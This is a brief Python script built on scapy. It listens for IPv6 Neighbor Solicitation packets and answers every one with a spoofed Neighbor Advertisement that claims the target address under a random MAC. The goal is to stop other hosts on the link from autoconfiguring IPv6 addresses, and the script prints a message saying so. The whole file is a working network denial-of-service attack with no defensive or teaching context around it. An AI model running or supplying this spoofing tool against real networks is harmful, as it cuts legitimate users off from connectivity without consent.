#!/usr/bin/python
import random
from scapy.layers.inet6 import ICMPv6ND_NS, IPv6, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import sniff, send

# Generate packet
while True:
    packet_capture = sniff(lfilter=lambda pkt: ICMPv6ND_NS in pkt, count=1)
    base = IPv6()
    base.src = packet_capture[0][IPv6][ICMPv6ND_NS].tgt
    base.dst = packet_capture[0][IPv6].src
    random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255))
    packet_response = base / ICMPv6ND_NA(R=0, S=0, O=1, tgt=base.src) / \
                      ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
    send(packet_response, verbose=False)
    print("Preventing a host to autoconfigure IPv6 address " + base.src)
